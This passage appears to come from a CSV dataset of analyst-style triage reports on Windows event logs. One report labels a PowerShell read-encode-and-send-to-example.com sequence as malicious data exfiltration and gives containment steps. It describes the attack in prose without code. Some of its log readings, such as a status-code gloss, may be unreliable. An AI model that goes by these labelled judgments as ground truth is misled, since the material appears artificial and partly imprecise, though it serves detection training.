   - Review and strengthen PowerShell execution policies and log management through group policy settings.

3. **Further Monitoring:**
   - Enhance monitoring around critical systems in the environment, focusing on similar scripts or network traffic that could indicate further exploitation.

### Resolution:
- **SUSPICIOUS** - The logs indicate suspicious activity that does not look right and necessitates further investigation to confirm potential malicious actions. Immediate attention and response actions are advised to identify and mitigate any ongoing threats."
Network-Based Data Transfer in Small Chunks,"Upon reviewing the provided Windows event logs, the following observations can be made:

1. **System Logs**: These logs largely revolve around Windows Update activities, specifically indicating updates to the Microsoft Defender Antivirus signatures. The presence of event IDs 44, 43, and 19 from the WindowsUpdateClient provider is typically indicative of normal update processes and does not raise any concerns.

2. **Application Logs**: The entry indicating that Windows Defender is in the ""SECURITY_PRODUCT_STATE_ON"" state denotes that the antivirus is active and should be operational, which is a good security posture.

3. **Sysmon Logs**:
    - The frequent execution of `wevtutil.exe` and `conhost.exe` could be part of normal administrative tasks, especially if the user `admin_test` is an administrator or responsible for system maintenance.
    - The execution of processes like `whoami.exe` and `hostname.exe` by `admin_test` appear normal as these tools are often used for querying the system state and user information.
    - A notable entry is the execution of `powershell.exe` with a command to read a file and encode its contents in Base64, followed by a network request to `http://example.com`. This behavior is consistent with data exfiltration activities and qualifies as suspicious.

4. **Security Logs**: Multiple Event ID 5379 entries are related to credential read operations but returned a code of `3221226021`, which typically means ""STATUS_CANNOT_DELETE”. These appear benign in context as they could result from legitimate system operations.

5. **Windows PowerShell Logs**: The logs show a PowerShell session executing a potentially malicious script as described above, involving reading a file, encoding its contents, and attempting to send the data over the network to an external site. This behavior is highly indicative of unauthorized data exfiltration using PowerShell, which is a common tactic used by attackers.

**Assessment**:
- The overall series of logs indicates a particular PowerShell script execution that is attempting to exfiltrate data. This specific activity suggests malicious intent, as it attempts to use a typical data exfiltration technique.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
1. **Containment**:
   - Immediately isolate the affected host `Server002` from the network to prevent potential data exfiltration and further spread of any compromise.
   
2. **Eradication and Recovery**:
   - Conduct a thorough investigation to identify and eradicate the PowerShell script or any other suspicious scripts or executables.
   - Validate and ensure that the antivirus and malware protection software is updated and operational.
   - Review and tighten PowerShell execution policies and consider logging all scripts executed.
   - Conduct a security audit on `admin_test` account and other privileged accounts to ensure no further access by the attacker.

3. **Restoration**:
